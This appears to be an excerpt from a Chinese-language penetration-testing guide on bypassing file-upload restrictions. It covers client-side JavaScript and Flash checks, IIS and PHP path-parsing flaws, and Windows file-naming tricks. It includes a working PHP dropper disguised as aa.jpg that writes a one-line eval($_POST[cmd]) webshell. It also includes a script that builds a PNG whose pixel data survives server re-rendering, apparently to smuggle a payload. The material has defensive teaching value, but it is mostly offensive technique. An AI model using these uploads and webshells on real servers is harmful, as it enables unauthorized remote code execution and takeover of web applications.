    2.1. 检测分类

    客户端检测一般只检测文件扩展名

    2.1.1. JavaScript检测

    提交上传请求前，触发JS脚本检测
    例如：普通的表单上传

    • 查看onchange、onsubmit等事件
    • 删除掉相关事件中的检测函数

    2.1.2. Flash AS脚本检测

    提交上传请求前，触发AS脚本检测
    例如：DZ的头像上传

    2.1.3. app上传检测

    检测写在app客户端代码中，或者所调用的HTML页面中

    4. 解析漏洞

    4.1. IIS解析漏洞

    4.1.1. IIS7.5文件解析漏洞（test.jpg/*.php)

    上传一个名为aa.jpg,内容为
    <? php fputs(fopen('shell.php','w'), '<?php eval($_POST[cmd]) ?>' )

    访问aa.jpg/.php后触发此漏洞,会在当前目录下生成一个一句话的木马shell.php

    形式：www.xxx.com/logo.jpg/x.php
原理：在php配置文件中开启cgi.fix_pathinfo导致

    4.1.2. IIS5.X-IIS6.X（win2003 server，仅能解析asp）：

    适用于：win2003 server，仅能解析asp
    解析文件类型
    /test.asp /test.cer /test.asa /test.cdx

    4.1.2.1. 目录名解析（/test.asp/1.jpg）

    形式：www.xxx.com/xx.asp/xx.jpg
    原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。

    4.1.2.2. 文件名解析(test.asp;.jpg)

    形式：www.xxx.com/xx.asp;.jpg
原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成xx.asp文件了。

    4.1.3. Windows命名规范

    非法命名：
    包含 \  /  : *  ?  "  <  > |
    xx.jpg[空格]
    xx.jpg.
    xx.jpg::$DATA

    5.1. 重绘图

    <?php
//png.php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'./1.png');
?>
